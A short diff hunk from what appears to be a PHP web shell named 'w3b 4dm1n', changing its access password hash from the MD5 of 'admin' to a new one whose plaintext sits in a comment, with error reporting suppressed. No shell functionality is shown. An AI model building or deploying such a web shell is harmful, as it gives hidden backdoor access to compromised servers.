@@ -10,7 +10,7 @@ error_reporting(0);
 $s_name = "w3b"; // shell name
 $s_ver = "4dm1n"; // shell ver
 $s_title = $s_name." ".$s_ver; // shell title
-$s_pass = "21232f297a57a5a743894a0e4a801fc3"; // default : admin
+$s_pass = "a3eb845eefc2d81915365c03b31534b6"; // ImSle3pyGnsha
 $s_color = "ff0000"; // shell theme color, default : 4c83af
 $s_login_time = 3600 * 24 * 7; // cookie time (login)
 
